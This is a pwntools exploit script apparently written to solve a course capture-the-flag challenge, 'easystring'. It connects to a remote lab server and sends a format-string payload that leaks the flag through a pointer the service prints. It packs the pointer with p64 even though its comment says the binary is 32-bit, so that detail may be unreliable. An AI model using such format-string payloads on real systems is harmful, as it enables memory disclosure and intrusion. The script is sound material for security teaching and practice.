#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template string
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('easystring')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return remote('cs412.polygl0ts.ch', 9003)
        # return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

io.recvuntil(b'Hmmm look at this interesting pointer: ')

# Receive the flag pointer line
flag_ptr_line = io.recvline()
print(flag_ptr_line)

flag_ptr = int(flag_ptr_line.strip(), 16)
print(flag_ptr)

# Receive the second line containing the value of 'n'
io.recvline()

# Send the format string payload to leak the flag
payload = b'%9$s' + b'|' * 4 + p64(flag_ptr)
io.sendline(payload)


io.interactive()

